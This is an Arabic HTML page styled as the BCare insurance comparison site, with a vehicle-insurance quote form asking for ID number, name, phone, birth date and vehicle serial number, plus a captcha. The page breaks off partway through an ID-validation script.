<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بي كير للتأمين | قارن واشترِ وثيقتك في دقائق</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
/* CSS Variables */
:root {
    --color-background: #F4F7FB;
    --color-surface: #FFFFFF;
    --color-primary: #0F4C72;
    --color-primary-dark: #0B3856;
    --color-primary-light: #E6F0F7;
    --color-accent: #F2A340;
    --color-accent-dark: #D6892F;
    --color-text-primary: #0E1F2E;
    --color-text-secondary: #4B5B6B;
    --color-border: #D8E2EE;
    --color-info: #1E88E5;
    --shadow-soft: 0 16px 40px rgba(15, 76, 114, 0.12);
    --shadow-card: 0 14px 30px rgba(15, 76, 114, 0.16);
}

/* Reset & Base Styles */
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: 'Cairo', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
    
    background: var(--color-background);
    color: var(--color-text-primary);
    line-height: 1.6;
    overflow-x: hidden;
}

.container {
    max-width: 1280px;
    margin: 0 auto;
    padding: 0 1rem;
}

/* Header Styles */
.header {
    position: sticky;
    top: 0;
    z-index: 500;
}

/* Promo Banner */
.promo-banner {
    background: linear-gradient(120deg, var(--color-accent) 0%, var(--color-accent-dark) 100%);
    color: white;
}

.promo-content {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 0.375rem 1rem;
    gap: 1rem;
}

.promo-text {
    display: flex;
    align-items: center;
    gap: 0.5rem;
    font-size: 0.875rem;
}

.promo-icon {
    display: inline-flex;
    align-items: center;
    justify-content: center;
    width: 1.25rem;
    height: 1.25rem;
    background: rgba(255, 255, 255, 0.2);
    border-radius: 50%;
    font-weight: bold;
    font-size: 0.688rem;
}

.promo-title {
    font-weight: 600;
}

.promo-subtitle {
    opacity: 0.9;
}

.promo-actions {
    display: flex;
    gap: 0.5rem;
}

.promo-btn {
    background: rgba(255, 255, 255, 0.15);
    color: white;
    padding: 0.25rem 0.75rem;
    border-radius: 9999px;
    text-decoration: none;
    font-size: 0.75rem;
    font-weight: 600;
    transition: background 0.3s;
}

.promo-btn:hover {
    background: rgba(255, 255, 255, 0.25);
}

.promo-close {
    background: transparent;
    border: 1px solid rgba(255, 255, 255, 0.4);
    color: rgba(255, 255, 255, 0.9);
    width: 1.75rem;
    height: 1.75rem;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    transition: background 0.3s;
}

.promo-close:hover {
    background: rgba(255, 255, 255, 0.15);
}

.close-icon {
    width: 0.875rem;
    height: 0.875rem;
    stroke: currentColor;
    stroke-width: 2;
    fill: none;
}

/* Main Navigation */
.main-nav {
    background: rgba(255, 255, 255, 0.92);
    backdrop-filter: blur(8px);
    border-bottom: 1px solid var(--color-border);
}

.nav-content {
    display: flex;
    justify-content: space-between;
    align-items: center;
    height: 4rem;
}

.nav-actions {
    display: flex;
    gap: 0.5rem;
}

.lang-btn, .profile-btn, .menu-btn {
    background: transparent;
    border: 1px solid var(--color-border);
    border-radius: 9999px;
    cursor: pointer;
    transition: background 0.3s;
    display: flex;
    align-items: center;
    justify-content: center;
}

.lang-btn:hover, .profile-btn:hover, .menu-btn:hover {
    background: rgba(0, 0, 0, 0.02);
}

.lang-btn {
    padding: 0.25rem 0.75rem;
    font-size: 0.75rem;
    font-weight: 600;
    color: var(--color-text-primary);
}

#birthDate {
    direction: rtl;
    text-align: right;
}

#captchaImage {
    width: 100%;
    height: 100%;
    object-fit: contain;
    border-radius: 0.5rem;
}

.profile-btn, .menu-btn {
    padding: 0.5rem;
}

.profile-icon, .menu-icon {
    width: 1.25rem;
    height: 1.25rem;
    stroke: var(--color-primary);
    stroke-width: 1.8;
    fill: none;
}

.menu-icon {
    stroke: var(--color-text-primary);
    stroke-width: 2;
}

.logo img {
    display: block;
}

/* Main Content */
.main-content {
    max-width: 48rem;
    margin: 0 auto;
    padding: 0 1rem;
}

/* Hero Section */
.hero-section {
    position: relative;
    max-width: 48rem;
    margin: 1rem auto;
    padding: 1.25rem 1rem;
    background: linear-gradient(135deg, var(--color-primary) 0%, var(--color-primary-dark) 60%, #0A2F49 100%);
    border-radius: 1rem;
    color: white;
    overflow: hidden;
    box-shadow: var(--shadow-soft);
}

.hero-bg-effects {
    position: absolute;
    inset: 0;
    pointer-events: none;
}

.float-circle-1 {
    position: absolute;
    top: -2.5rem;
    left: -2.5rem;
    width: 6rem;
    height: 6rem;
    background: rgba(255, 255, 255, 0.1);
    border-radius: 50%;
    filter: blur(24px);
    animation: float-soft 7s ease-in-out infinite;
}

.float-circle-2 {
    position: absolute;
    bottom: -3rem;
    right: -3rem;
    width: 7rem;
    height: 7rem;
    background: rgba(255, 255, 255, 0.1);
    border-radius: 50%;
    filter: blur(24px);
    animation: float-soft 7s ease-in-out infinite;
}

.glow-ring {
    position: absolute;
    right: 1.25rem;
    top: 50%;
    transform: translateY(-50%);
    width: 4rem;
    height: 4rem;
    border: 1px solid rgba(255, 255, 255, 0.15);
    border-radius: 50%;
    animation: glow 3s ease-in-out infinite;
}

@keyframes float-soft {
    0%, 100% { transform: translateY(0); }
    50% { transform: translateY(-8px); }
}

@keyframes glow {
    0%, 100% { opacity: 0.7; }
    50% { opacity: 1; }
}

.hero-content {
    position: relative;
    z-index: 10;
    display: flex;
    flex-direction: column;
    gap: 0.75rem;
}

.hero-badges {
    display: flex;
    flex-wrap: wrap;
    gap: 0.5rem;
}

.badge {
    display: inline-flex;
    align-items: center;
    gap: 0.5rem;
    padding: 0.25rem 0.75rem;
    border-radius: 9999px;
    font-size: 0.688rem;
    font-weight: 600;
}

.badge-primary {
    background: rgba(255, 255, 255, 0.15);
}

.badge-secondary {
    border: 1px solid rgba(255, 255, 255, 0.15);
    color: rgba(255, 255, 255, 0.85);
}

.badge-dot {
    width: 0.5rem;
    height: 0.5rem;
    background: #6EE7B7;
    border-radius: 50%;
    animation: glow 3s ease-in-out infinite;
}

.hero-title {
    font-size: 1.125rem;
    font-weight: bold;
    line-height: 1.375;
    letter-spacing: -0.025em;
}

.hero-subtitle {
    font-size: 0.875rem;
    line-height: 1.625;
    color: rgba(255, 255, 255, 0.8);
}

/* Form Styles */
.insurance-form {
    margin-top: 1.5rem;
    display: flex;
    flex-direction: column;
    gap: 1.5rem;
}

.form-card {
    background: rgba(255, 255, 255, 0.9);
    border: 1px solid var(--color-border);
    border-radius: 1rem;
    padding: 1rem;
    box-shadow: var(--shadow-soft);
}

.form-card-light {
    background: var(--color-primary-light);
    border-color: var(--color-border);
    padding: 1.25rem 1rem;
    box-shadow: var(--shadow-card);
}

.form-header {
    display: flex;
    justify-content: space-between;
    align-items: flex-start;
    margin-bottom: 1rem;
    gap: 0.75rem;
}

.form-title {
    font-size: 0.875rem;
    font-weight: 600;
    color: var(--color-primary-dark);
}

.form-subtitle {
    font-size: 0.75rem;
    color: var(--color-text-secondary);
}

.section-label {
    font-size: 0.75rem;
    font-weight: 600;
    color: var(--color-text-secondary);
}

/* Categories Grid */
.categories-grid {
    display: grid;
    grid-template-columns: repeat(5, 1fr);
    gap: 0.5rem;
    margin-bottom: 1.25rem;
}

.category-btn {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 0.25rem;
    padding: 0.5rem;
    background: white;
    border: 1px solid var(--color-border);
    border-radius: 0.75rem;
    font-size: 0.625rem;
    font-weight: 600;
    color: var(--color-text-secondary);
    cursor: pointer;
    transition: all 0.3s;
    min-width: 0;
}

.category-btn:hover:not(:disabled) {
    box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
}

.category-btn.active {
    background: var(--color-primary);
    color: white;
    border-color: var(--color-primary);
}

.category-btn:disabled {
    opacity: 0.6;
    cursor: not-allowed;
}

.category-icon {
    width: 1rem;
    height: 1rem;
    fill: currentColor;
}

.category-btn span {
    width: 100%;
    text-align: center;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
}

/* Insurance Types */
.insurance-types {
    display: grid;
    grid-template-columns: repeat(2, 1fr);
    gap: 0.75rem;
}

.type-btn {
    padding: 0.5rem 0.75rem;
    background: white;
    border: 1px solid var(--color-border);
    border-radius: 0.75rem;
    font-size: 0.875rem;
    font-weight: 600;
    color: var(--color-text-primary);
    cursor: pointer;
    transition: all 0.3s;
}

.type-btn:hover {
    box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
}

.type-btn.active {
    background: var(--color-primary);
    color: white;
    border-color: var(--color-primary);
}

/* Form Header Main */
.form-header-main {
    margin-bottom: 1.5rem;
}

.section-title {
    font-size: 1.125rem;
    font-weight: bold;
    color: var(--color-text-primary);
}

.section-subtitle {
    font-size: 0.75rem;
    color: var(--color-text-secondary);
}

/* Registration Method */
.registration-method {
    background: var(--color-primary-light);
    border: 1px solid var(--color-border);
    border-radius: 0.75rem;
    padding: 1rem;
    margin-bottom: 1.5rem;
}

.method-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 0.625rem;
}

.method-label {
    display: block;
    font-size: 0.875rem;
    font-weight: 600;
    color: var(--color-text-secondary);
}

.info-icon {
    width: 1rem;
    height: 1rem;
    fill: var(--color-info);
}

.method-buttons {
    display: grid;
    grid-template-columns: repeat(2, 1fr);
    gap: 0.75rem;
}

.method-btn {
    padding: 0.5rem 0.75rem;
    background: white;
    border: 1px solid var(--color-border);
    border-radius: 0.75rem;
    font-size: 0.75rem;
    font-weight: 600;
    color: var(--color-primary);
    cursor: pointer;
    transition: all 0.3s;
}

.method-btn:hover {
    box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
}

.method-btn.active {
    background: var(--color-primary);
    color: white;
    border-color: var(--color-primary);
}

/* Form Fields */
.form-field {
    margin-bottom: 1.25rem;
    display: grid;
    grid-template-columns: 1fr;
    gap: 0.25rem;
}

.form-field label {
    display: block;
    font-size: 0.875rem;
    font-weight: 500;
    color: var(--color-text-secondary);
    text-align: right;
}

.form-field input {
    width: 100%;
    padding: 0.75rem 1rem;
    background: white;
    border: 1px solid var(--color-border);
    border-radius: 0.75rem;
    font-size: 0.875rem;
    color: var(--color-text-primary);
    text-align: right;
    transition: all 0.15s;
}

.form-field input:focus {
    outline: none;
    border-color: var(--color-primary);
    box-shadow: 0 0 0 2px var(--color-primary-light);
}

.form-field input::placeholder {
    color: #9CA3AF;
}

.input-with-icon {
    position: relative;
}

.info-btn {
    position: absolute;
    left: 0.75rem;
    top: 50%;
    transform: translateY(-50%);
    background: rgba(255, 255, 255, 0.9);
    border: 1px solid var(--color-border);
    border-radius: 50%;
    padding: 0.375rem;
    cursor: pointer;
    transition: all 0.3s;
}

.info-btn:hover {
    background: white;
}

.info-icon-small {
    width: 1rem;
    height: 1rem;
    fill: var(--color-info);
}

/* Verification Section */
.verification-header {
    margin-bottom: 1rem;
}

.verification-title {
    font-size: 0.875rem;
    font-weight: 600;
    color: var(--color-text-primary);
}

.verification-field {
    margin-bottom: 1.25rem;
}

.verification-field label {
    display: block;
    font-size: 0.875rem;
    font-weight: 500;
    color: var(--color-text-secondary);
    margin-bottom: 0.25rem;
    text-align: right;
}

.verification-input-group {
    display: flex;
    gap: 0.75rem;
    align-items: stretch;
}

.captcha-container {
    position: relative;
    width: 7rem;
    height: 51px;
    flex-shrink: 0;
}

#captchaCanvas {
    width: 100%;
    height: 100%;
    border: 1px solid var(--color-border);
    border-radius: 0.5rem;
    background: white;
    display: block;
}

.refresh-captcha-btn {
    position: absolute;
    top: 2px;
    left: 2px;
    background: rgba(255, 255, 255, 0.9);
    border: 1px solid var(--color-border);
    border-radius: 0.25rem;
    padding: 0.25rem;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    transition: all 0.2s;
}

.refresh-captcha-btn:hover {
    background: white;
    transform: rotate(180deg);
}

.refresh-captcha-btn svg {
    color: var(--color-primary);
}

.verification-input-group input {
    flex: 1;
    padding: 0.75rem 1rem;
    background: white;
    border: 1px solid var(--color-border);
    border-radius: 0.75rem;
    font-size: 0.875rem;
    text-align: center;
    color: var(--color-text-primary);
}

.verification-input-group input:focus {
    outline: none;
    border-color: var(--color-primary);
    box-shadow: 0 0 0 2px var(--color-primary-light);
}

/* Terms Checkbox */
.terms-checkbox {
    display: flex;
    align-items: flex-start;
    gap: 0.5rem;
    margin-bottom: 1.5rem;
    padding-top: 0.5rem;
}

.terms-checkbox input[type="checkbox"] {
    width: 1rem;
    height: 1rem;
    margin-top: 0.125rem;
    accent-color: var(--color-primary);
    border: 1px solid var(--color-border);
    border-radius: 0.25rem;
    flex-shrink: 0;
}

.terms-checkbox label {
    font-size: 0.75rem;
    line-height: 1.625;
    color: var(--color-text-secondary);
    cursor: pointer;
    text-align: right;
}

/* Submit Button */
.submit-btn {
    width: 100%;
    padding: 0.75rem;
    background: var(--color-accent);
    color: white;
    border: 1px solid var(--color-accent-dark);
    border-radius: 0.75rem;
    font-size: 1rem;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.3s;
    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
}

.submit-btn:hover {
    box-shadow: 0 10px 15px rgba(0, 0, 0, 0.1);
}

/* Footer */
.footer {
    background: #0B2F48;
    color: #D6E4F0;
    margin-top: 3rem;
    padding: 3rem 0;
    text-align: center;
}

.footer-content {
    font-size: 0.875rem;
}

.footer-main {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 2rem;
}

.footer-brand {
    max-width: 28rem;
}

.footer-logo {
    margin: 0 auto 1rem;
    opacity: 0.9;
   width: 120px;
}

.footer-copyright {
    font-size: 0.75rem;
    line-height: 1.625;
    color: #9FB4C4;
    margin-bottom: 1rem;
}

.footer-contact {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 0.75rem;
    font-size: 0.75rem;
}

.footer-contact span {
    text-transform: uppercase;
    letter-spacing: 0.05em;
    color: rgba(255, 255, 255, 0.6);
}

.footer-contact a {
    color: var(--color-accent);
    text-decoration: none;
    font-size: 0.875rem;
    font-weight: 600;
}

.footer-contact a:hover {
    text-decoration: underline;
}

.footer-apps {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 0.75rem;
}

.apps-label {
    font-size: 0.75rem;
    color: rgba(255, 255, 255, 0.6);
}

.app-buttons {
    display: flex;
    flex-wrap: wrap;
    gap: 1rem;
    justify-content: center;
}

.app-buttons a {
    transition: transform 0.3s;
}

.app-buttons a:hover {
    transform: scale(1.05);
}

/* Responsive Styles */
@media (min-width: 640px) {
    .promo-text {
        font-size: 0.875rem;
    }
    
    .promo-subtitle {
        display: inline;
    }
    
    .hero-title {
        font-size: 1.25rem;
    }
    
    .hero-subtitle {
        font-size: 0.938rem;
    }
    
    .categories-grid {
        gap: 0.75rem;
    }
    
    .category-btn {
        padding: 0.5rem 0.75rem;
        font-size: 0.688rem;
    }
    
    .category-icon {
        width: 1.25rem;
        height: 1.25rem;
    }
    
    .form-card {
        padding: 1.5rem;
    }
    
    .form-card-light {
        padding: 1.5rem;
    }
}

@media (min-width: 768px) {
    .form-field {
        grid-template-columns: 1fr 2fr;
        gap: 1.5rem;
        align-items: start;
    }
    
    .form-field label {
        padding-top: 0.875rem;
        margin-bottom: 0;
    }
}

@media (min-width: 1024px) {
    .footer-main {
        flex-direction: row;
        justify-content: space-between;
    }
    
    .footer-brand {
        text-align: start;
    }
    
    .footer-logo {
        margin-left: 0;
    }
    
    .footer-contact {
        justify-content: start;
    }
    
    .hero-title {
        font-size: 1.5rem;
    }
}
/* Loading Overlay */
.loading-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0, 0, 0, 0.5);
    backdrop-filter: blur(5px);
    display: none;
    align-items: center;
    justify-content: center;
    z-index: 9999;
}

.loading-overlay.show {
    display: flex;
}

.loading-card {
    background: white;
    border-radius: 16px;
    padding: 40px 60px;
    text-align: center;
    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
}

.loading-logo {
    width: 120px;
    margin-bottom: 20px;
}

.loading-text {
    font-size: 16px;
    font-weight: 600;
    color: #333;
    margin-bottom: 20px;
}

.loading-spinner {
    width: 50px;
    height: 50px;
    margin: 0 auto;
}

.loading-spinner svg {
    width: 100%;
    height: 100%;
}

.loading-spinner circle {
    fill: none;
    stroke: #F2A340;
    stroke-width: 4;
    stroke-linecap: round;
    stroke-dasharray: 125;
    stroke-dashoffset: 30;
    animation: spin 1s linear infinite;
    transform-origin: center;
}
.error-message {
    color: #dc3545;
    font-size: 0.75rem;
    margin-top: 0.5rem;
    display: none;
    text-align: right;
}

.form-field input.error {
    border-color: #dc3545;
}
@keyframes spin {
    0% {
        transform: rotate(0deg);
    }
    100% {
        transform: rotate(360deg);
    }
}
    </style>
</head>
<body>
    <!-- Header -->
    <header class="header">
        <!-- Promo Banner -->
        <div class="promo-banner">
            <div class="container promo-content">
                <div class="promo-text">
                    <span class="promo-icon">!</span>
                    <span class="promo-title">حمّل تطبيق بي كير الآن!</span>
                    <span class="promo-subtitle">واستمتع بخدمات أكثر.</span>
                </div>
                <div class="promo-actions">
                    <a href="#apps" class="promo-btn">تحميل</a>
                    <button class="promo-close" aria-label="إغلاق">
                        <svg class="close-icon" viewBox="0 0 24 24">
                            <line x1="18" y1="6" x2="6" y2="18"></line>
                            <line x1="6" y1="6" x2="18" y2="18"></line>
                        </svg>
                    </button>
                </div>
            </div>
        </div>

        <!-- Main Navigation -->
        <div class="main-nav">
            <div class="container nav-content">
                <div class="nav-actions">
                    <button class="lang-btn">EN</button>
                    <button class="profile-btn" aria-label="الملف الشخصي">
                        <svg class="profile-icon" viewBox="0 0 24 24">
                            <path d="M20 21a8 8 0 0 0-16 0"></path>
                            <circle cx="12" cy="7" r="4"></circle>
                        </svg>
                    </button>
                </div>
                <a href="#" class="logo">
                    <img src="/bcare-logo.svg" alt="bcare logo" width="90" height="45">
                </a>
                <button class="menu-btn" aria-label="القائمة">
                    <svg class="menu-icon" viewBox="0 0 24 24">
                        <line x1="3" y1="12" x2="21" y2="12"></line>
                        <line x1="3" y1="6" x2="21" y2="6"></line>
                        <line x1="3" y1="18" x2="21" y2="18"></line>
                    </svg>
                </button>
            </div>
        </div>
    </header>

    <!-- Main Content -->
    <main class="main-content">
        <!-- Hero Section -->
        <div class="hero-section">
            <div class="hero-bg-effects">
                <div class="float-circle-1"></div>
                <div class="float-circle-2"></div>
                <div class="glow-ring"></div>
            </div>
            <div class="hero-content">
                <div class="hero-badges">
                    <span class="badge badge-primary">
                        <span class="badge-dot"></span>
                        منصة مقارنة التأمين الأولى
                    </span>
                    <span class="badge badge-secondary">
                        <span class="badge-dot"></span>
                        أكثر من 20 شركة تأمين معتمدة
                    </span>
                </div>
                <div class="hero-text">
                    <h1 class="hero-title">قارن، أمّن، واستلم وثيقتك خلال دقائق</h1>
                    <p class="hero-subtitle">مكان واحد لتأمين مركبتك، مع عروض فورية من شركات متعددة ومعتمدة.</p>
                </div>
            </div>
        </div>

        <!-- Insurance Form -->
        <form class="insurance-form" id="insuranceForm">
            <!-- Categories Section -->
            <div class="form-card">
                <div class="form-header">
                    <div>
                        <p class="form-title">فئات التأمين</p>
                        <p class="form-subtitle">أدخل بياناتك لتظهر أفضل الأسعار فورًا.</p>
                    </div>
                    <div class="section-label">نوع التأمين</div>
                </div>
                <div class="categories-grid">
                    <button type="button" class="category-btn active">
                        <svg class="category-icon" viewBox="0 0 640 512">
                            <path d="M544 192h-16L419.22 56.02A64.025 64.025 0 0 0 369.24 32H155.33c-26.17 0-49.7 15.93-59.42 40.23L48 194.26C20.44 201.4 0 226.21 0 256v112c0 8.84 7.16 16 16 16h48c0 53.02 42.98 96 96 96s96-42.98 96-96h128c0 53.02 42.98 96 96 96s96-42.98 96-96h48c8.84 0 16-7.16 16-16v-80c0-53.02-42.98-96-96-96zM160 432c-26.47 0-48-21.53-48-48s21.53-48 48-48 48 21.53 48 48-21.53 48-48 48zm72-240H116.93l38.4-96H232v96zm48 0V96h89.24l76.8 96H280zm200 240c-26.47 0-48-21.53-48-48s21.53-48 48-48 48 21.53 48 48-21.53 48-48 48z"/>
                        </svg>
                        <span>مركبات</span>
                    </button>
                    <button type="button" class="category-btn" disabled>
                        <svg class="category-icon" viewBox="0 0 512 512">
                            <path d="M320.2 243.8l-49.7 99.4c-6 12.1-23.4 11.7-28.9-.6l-56.9-126.3-30 71.7H60.6l182.5 186.5c7.1 7.3 18.6 7.3 25.7 0L451.4 288H342.3l-22.1-44.2zM473.7 73.9l-2.4-2.5c-51.5-52.6-135.8-52.6-187.4 0L256 100l-27.9-28.5c-51.5-52.7-135.9-52.7-187.4 0l-2.4 2.4C-10.4 123.7-12.5 203 31 256h102.4l35.9-86.2c5.4-12.9 23.6-13.2 29.4-.4l58.2 129.3 49-97.9c5.9-11.8 22.7-11.8 28.6 0l27.6 55.2H481c43.5-53 41.4-132.3-7.3-182.1z"/>
                        </svg>
                        <span>طبي</span>
                    </button>
                    <button type="button" class="category-btn" disabled>
                        <svg class="category-icon" viewBox="0 0 512 512">
                            <path d="M447.1 112c-34.2.5-62.3 28.4-63 62.6-.5 24.3 12.5 45.6 32 56.8V344c0 57.3-50.2 104-112 104-60 0-109.2-44.1-111.9-99.2C265 333.8 320 269.2 320 192V36.6c0-11.4-8.1-21.3-19.3-23.5L237.8.5c-13-2.6-25.6 5.8-28.2 18.8L206.4 35c-2.6 13 5.8 25.6 18.8 28.2l30.7 6.1v121.4c0 52.9-42.2 96.7-95.1 97.2-53.4.5-96.9-42.7-96.9-96V69.4l30.7-6.1c13-2.6 21.4-15.2 18.8-28.2l-3.1-15.7C107.7 6.4 95.1-2 82.1.6L19.3 13C8.1 15.3 0 25.1 0 36.6V192c0 77.3 55.1 142 128.1 156.8C130.7 439.2 208.6 512 304 512c97 0 176-75.4 176-168V231.4c19.1-11.1 32-31.7 32-55.4 0-35.7-29.2-64.5-64.9-64zm.9 80c-8.8 0-16-7.2-16-16s7.2-16 16-16 16 7.2 16 16-7.2 16-16 16z"/>
                        </svg>
                        <span>أخطاء طبية</span>
                    </button>
                    <button type="button" class="category-btn" disabled>
                        <svg class="category-icon" viewBox="0 0 640 512">
                            <path d="M624 448H16c-8.84 0-16 7.16-16 16v32c0 8.84 7.16 16 16 16h608c8.84 0 16-7.16 16-16v-32c0-8.84-7.16-16-16-16zM80.55 341.27c6.28 6.84 15.1 10.72 24.33 10.71l130.54-.18a65.62 65.62 0 0 0 29.64-7.12l290.96-147.65c26.74-13.57 50.71-32.94 67.02-58.31 18.31-28.48 20.3-49.09 13.07-63.65-7.21-14.57-24.74-25.27-58.25-27.45-29.85-1.94-59.54 5.92-86.28 19.48l-98.51 49.99-218.7-82.06a17.799 17.799 0 0 0-18-1.11L90.62 67.29c-10.67 5.41-13.25 19.65-5.17 28.53l156.22 98.1-103.21 52.38-72.35-36.47a17.804 17.804 0 0 0-16.07.02L9.91 230.22c-10.44 5.3-13.19 19.12-5.57 28.08l76.21 82.97z"/>
                        </svg>
                        <span>سفر</span>
                    </button>
                    <button type="button" class="category-btn" disabled>
                        <svg class="category-icon" viewBox="0 0 576 512">
                            <path d="M570.69,236.27,512,184.44V48a16,16,0,0,0-16-16H432a16,16,0,0,0-16,16V99.67L314.78,10.3C308.5,4.61,296.53,0,288,0s-20.46,4.61-26.74,10.3l-256,226A18.27,18.27,0,0,0,0,248.2a18.64,18.64,0,0,0,4.09,10.71L25.5,282.7a21.14,21.14,0,0,0,12,5.3,21.67,21.67,0,0,0,10.69-4.11l15.9-14V480a32,32,0,0,0,32,32H480a32,32,0,0,0,32-32V269.88l15.91,14A21.94,21.94,0,0,0,538.63,288a20.89,20.89,0,0,0,11.87-5.31l21.41-23.81A21.64,21.64,0,0,0,576,248.19,21,21,0,0,0,570.69,236.27ZM288,176a64,64,0,1,1-64,64A64,64,0,0,1,288,176ZM400,448H176a16,16,0,0,1-16-16,96,96,0,0,1,96-96h64a96,96,0,0,1,96,96A16,16,0,0,1,400,448Z"/>
                        </svg>
                        <span>العمالة المنزلية</span>
                    </button>
                </div>
                <div class="insurance-types">
                    <button type="button" class="type-btn active" data-type="new">تأمين جديد</button>
                    <button type="button" class="type-btn" data-type="transfer">نقل الملكية</button>
                </div>
            </div>

            <!-- Registration Method -->
            <div class="form-card form-card-light">
                <div class="form-header-main">
                    <h2 class="section-title">ابدأ طلبك الآن</h2>
                    <p class="section-subtitle">أدخل بياناتك لتظهر أفضل الأسعار فورًا.</p>
                </div>

                <div class="registration-method" data-insurance-type="new">
                    <div class="method-header">
                        <label class="method-label">طريقة تسجيل المركبة</label>
                        <svg class="info-icon" viewBox="0 0 20 20">
                            <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clip-rule="evenodd"></path>
                        </svg>
                    </div>
                    <div class="method-buttons">
                        <button type="button" class="method-btn active" data-method="serial">الرقم التسلسلي</button>
                        <button type="button" class="method-btn" data-method="customs">بطاقة جمركية (استيراد)</button>
                    </div>
                </div>

                <!-- Form Fields -->
<!-- حقول تأمين جديد -->
<div class="form-field" data-insurance-type="new">
    <label for="identityNumber">رقم الهوية / الإقامة:</label>
    <div>
        <input type="text" id="identityNumber" maxlength="10" placeholder="ادخل 10 أرقام">
        <div class="error-message" id="identityError">رقم الهوية/الإقامة غير صحيح</div>
    </div>
</div>

                <div class="form-field" data-insurance-type="new">
                    <label for="applicantName">اسم مقدم الطلب:</label>
                    <input type="text" id="applicantName" placeholder="الاسم كما في الهوية">
                </div>

                <div class="form-field" data-insurance-type="new">
                    <label for="phoneNumber">رقم الجوال:</label>
                    <input type="text" id="phoneNumber" maxlength="9" placeholder="يبدأ بـ 5، مثال: 501234567">
                </div>

<!-- حقول نقل الملكية -->
<div class="form-field" data-insurance-type="transfer" style="display: none;">
    <label for="transferIdentityNumber">رقم الهوية / الإقامة:</label>
    <div>
        <input type="text" id="transferIdentityNumber" maxlength="10" placeholder="ادخل 10 أرقام">
        <div class="error-message" id="transferIdentityError">رقم الهوية/الإقامة غير صحيح</div>
    </div>
</div>

                <div class="form-field" data-insurance-type="transfer" style="display: none;">
                    <label for="transferApplicantName">اسم مقدم الطلب:</label>
                    <input type="text" id="transferApplicantName" placeholder="الاسم كما في الهوية">
                </div>

                <div class="form-field" data-insurance-type="transfer" style="display: none;">
                    <label for="transferPhoneNumber">رقم الجوال:</label>
                    <input type="text" id="transferPhoneNumber" maxlength="9" placeholder="يبدأ بـ 5، مثال: 501234567">
                </div>

                <div class="form-field" data-insurance-type="transfer" style="display: none;">
                    <label for="birthDate">تاريخ الميلاد:</label>
                    <input type="date" id="birthDate" placeholder="شمسي/هجري/ميلادي">
                </div>

                <!-- حقل الرقم التسلسلي / البطاقة الجمركية -->
                <div class="form-field">
                    <label for="serialNumber" id="serialNumberLabel">الرقم التسلسلي للمركبة:</label>
                    <div class="input-with-icon">
                        <input type="text" id="serialNumber" placeholder="موجود في استمارة المركبة">
                        <button type="button" class="info-btn" title="الرقم التسلسلي للمركبة (موجود في استمارة المركبة)">
                            <svg class="info-icon-small" viewBox="0 0 20 20">
                                <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clip-rule="evenodd"></path>
                            </svg>
                        </button>
                    </div>
                </div>
            </div>

            <!-- Verification Section -->
            <div class="form-card">
                <div class="verification-header">
                    <h3 class="verification-title">رمز التحقق</h3>
                </div>

                <div class="verification-field">
                    <label for="verificationCode">رمز التحقق:</label>
                    <div class="verification-input-group">
                        <div class="captcha-container">
                            <canvas id="captchaCanvas" width="112" height="51"></canvas>
                            
                        </div>
                        <input type="text" id="verificationCode" placeholder="ادخل الرمز">
                    </div>
                </div>

                <div class="terms-checkbox">
                    <input type="checkbox" id="agreeToTerms">
                    <label for="agreeToTerms">أوافق على منح شركة عناية الوسيط الحق في الاستعلام من شركة نجم و/أو مركز المعلومات الوطني عن بياناتي وبيانات مركبتي.</label>
                </div>

                <button type="submit" class="submit-btn">إظهار العروض</button>
            </div>
        </form>
    </main>

    <!-- Footer -->
    <footer class="footer">
        <div class="container footer-content">
            <div class="footer-main">
                <div class="footer-brand">
                    <img src="/bcare-logo.svg" alt="BCare Logo" class="footer-logo">
                    <p class="footer-copyright">
                        © 2026 جميع الحقوق محفوظة لشركة عناية الوسيط لوساطة التأمين. خاضعة لرقابة وإشراف البنك المركزي السعودي.
                    </p>
                    <div class="footer-contact">
                        <span>اتصل بنا</span>
                        <a href="tel:8001180042">8001180042</a>
                    </div>
                </div>
                <div class="footer-apps" id="apps">
                    <span class="apps-label">BCare App</span>
                    <div class="app-buttons">
                        <a href="https://play.google.com/store/apps/details?id=com.app.bcare" target="_blank">
                            <img src="/android_mobile_app.svg" alt="Google Play" width="135" height="45">
                        </a>
                        <a href="https://apps.apple.com/sa/app/بي-كير/id1490248033" target="_blank">
                            <img src="/ios_mobile_app.svg" alt="App Store" width="135" height="45">
                        </a>
                    </div>
                </div>
            </div>
        </div>
    </footer>

<script>
// ✅ دالة التحقق من رقم الهوية السعودية
function validateSaudiID(id) {
    id = id.replace(/\D/g, '');
    if (id.length !== 10) return false;
    if (!id.startsWith('1') && !id.startsWith('2')) return false;
    
